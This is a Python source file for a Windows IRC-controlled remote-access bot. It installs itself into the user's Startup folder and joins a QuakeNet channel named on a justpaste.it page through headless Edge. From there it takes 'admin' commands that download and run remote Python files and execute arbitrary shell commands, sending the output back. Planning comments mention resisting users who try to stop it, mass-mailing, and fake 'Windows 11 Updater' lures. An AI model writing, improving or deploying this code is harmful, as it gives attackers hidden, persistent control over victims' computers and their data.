import random
import requests
from bs4 import BeautifulSoup
from requests.api import get
from selenium import webdriver
from msedge.selenium_tools import EdgeOptions
from msedge.selenium_tools import Edge
from selenium.webdriver.common.keys import Keys
import time
import subprocess
import os
import shutil
from win32com.client import Dispatch
import zipfile

#2) Create Github structure & Upload more msedge driver versions
#3) Clients be able to upload files (optional)
#4) Testing against user trying to stop the system
#5) convert setup.bat to setup.exe 
#6) Developing Email concepts (Windows 11 Updater/Installer ????)
#7) YouTube concepts (Free ***)
#8) improving mass-mailer.py

ROOT_DIR = os.path.expandvars("C:/Users/%USERNAME%/")

DRIVER_DIR_PATH = f"{ROOT_DIR}/MicrosoftEdgeDriverClient"
CLIENT_DIR_PATH = f"{ROOT_DIR}/MicrosoftClient"

CLIENT_PATH = f"{CLIENT_DIR_PATH}/irc_client.py"
DRIVER_PATH = "None"

STARTUP_DIR = os.path.expandvars("C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")

IRC_SERVER_URL = "https://webchat.quakenet.org/"


def install_modules():
    try:
        os.system('pip install requests')
    except:
        try:
            os.system('python -m pip install requests')
        except:
            pass
    try:
        os.system('pip install bs4')
    except:
        try:
            os.system('python -m pip install bs4')
        except:
            pass
    try:
        os.system('pip install selenium')
    except:
        try:
            os.system('python -m pip install selenium')
        except:
            pass
    try:
        os.system('pip install selenium_tools')
    except:
        try:
            os.system('python -m pip install selenium_tools')
        except:
            pass
    try:
        os.system('pip install msedge-selenium-tools')
    except:
        try:
            os.system('python -m pip install msedge-selenium-tools')
        except:
            pass


def dl_msedgedriver(destination):
    global DRIVER_PATH
    paths = [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"]
    version = list(filter(None, [get_version_via_com(p) for p in paths]))[0]
    file_name = f"msedgedriver_{version}.zip"
    file_url = f"https://msedgedriver.azureedge.net/{version}/edgedriver_win32.zip"
    r = requests.get(file_url, allow_redirects=True)
    open(file_name, 'wb').write(r.content)
    move_file(file_name, destination)
    with zipfile.ZipFile(f"{destination}/{file_name}", 'r') as zip_ref:
        zip_ref.extractall(destination)
    
    #move_file(file_name, destination)
    DRIVER_PATH = f'{destination}/msedgedriver.exe'
    
def create_root_dir():
    os.system(f'cd {ROOT_DIR}')
    if os.path.isdir(DRIVER_DIR_PATH) == False:
        os.mkdir(DRIVER_DIR_PATH)
    if os.path.isdir(CLIENT_DIR_PATH) == False:
        os.mkdir(CLIENT_DIR_PATH)

    
def create_shortcut():
    cmd = f'python {CLIENT_PATH}'
    file = open(f'{STARTUP_DIR}/client.bat', 'w+')
    file.write(cmd)
    file.close()
    move_file(file, STARTUP_DIR)

def setup():# fix
    install_modules()
    create_root_dir()
    move_file(os.path.basename(__file__), CLIENT_DIR_PATH)
    dl_msedgedriver(DRIVER_DIR_PATH)
    create_shortcut()
    #pass



    
def get_version_via_com(filename):
    parser = Dispatch("Scripting.FileSystemObject")
    try:
        version = parser.GetFileVersion(filename)
    except Exception:
        return None
    return version
    
def get_channel():
    channel_url = "https://justpaste.it/u/channel"
    r = requests.get(channel_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    for title in soup.find_all('title'):
        return str(title.get_text()).split("-")[0].replace(" ", "")

def get_nick():
    return "client"+str(random.randint(1000000, 10000000))

def execute(cmd, nick):
    #load py https://ftp.com/file.py
    #
    #
    #   @all load py <url>
    #   @client2445435 load py <url>
    #   @client34342 shell: <command>
    #
    #
    #

    arg = cmd.split(" ")[0]
    if arg == "@all" or arg == f"@{nick}":
        if "load py" in cmd:
            try:
                file_url = cmd.split(" ")[3]
                file_name = cmd.split("/")[file_url.count("/")]
                #print(file_name)
                
                r = requests.get(file_url, allow_redirects=True)
                open(file_name, 'wb').write(r.content)
                return "None"
            except:
                return f"Error! Could not load {file_name} from {file_url}"
        
        elif "run py" in cmd:
            try:
                file_name = cmd.split(" ")[3]
                os.system(f'py {file_name}')
                return "None"
            except:
                return f"Error! Could not execute {file_name}"
        
        elif "shell" in cmd:
            command = cmd.replace(f"@{nick} shell: ", "")
            output = subprocess.getoutput(command)
            return str(output)
        else:
            return "None"
    else:
        return "None"    


def move_file(file, to):
    try:
        shutil.move(file, to+"/"+file)
    except:
        pass

def connect(url, nick, channel):
    options = EdgeOptions()
    options.use_chromium = True
    options.add_argument("--headless")
    options.add_argument("disable-gpu")
    driver = Edge(executable_path=DRIVER_PATH, options=options)
    driver.get(url)
    time.sleep(4)
    driver.find_element_by_xpath('/html/body/div/div[4]/table/tbody/tr/td/table/tbody/tr[3]/td/form/table/tbody/tr[1]/td[2]/input').send_keys(nick)
    time.sleep(2)
    driver.find_element_by_xpath('/html/body/div/div[4]/table/tbody/tr/td/table/tbody/tr[3]/td/form/table/tbody/tr[2]/td[2]/input').send_keys(channel)
    time.sleep(2)
    driver.find_element_by_xpath('/html/body/div/div[4]/table/tbody/tr/td/table/tbody/tr[3]/td/form/table/tbody/tr[3]/td[2]/input').click()
    time.sleep(10)
    last_index = 0
    while True:
        message = ""
        index = 100
        found = False
        while found == False:
            #print(index)
            if index < last_index:
                break
            try:
                message = driver.find_element_by_xpath(f'/html/body/div/div[4]/div[{index}]').text
                #print(message, index)
                if "admin" in message and last_index != index:
                    #print(f"Found: {message} : lastindex: {last_index} index: {index}")                                    
                    found = True
                    last_index = index
                    
            except:
                pass
            index-=1
            
        if found:
            print(message)
            tmp = message.split(">")[1]
            command = tmp[1:]
            print(command)
            
            result = execute(command, nick)
            print(result)
            if result != "None":
                driver.find_element_by_xpath('/html/body/div/div[6]/form/input').send_keys(result)  
                driver.find_element_by_xpath('/html/body/div/div[6]/form/input').send_keys(Keys.ENTER)
        #print("sleep 10")
        time.sleep(10)

if __name__ == "__main__":
    setup()
    nick = get_nick()
    channel = get_channel()
    connect(IRC_SERVER_URL, nick, channel)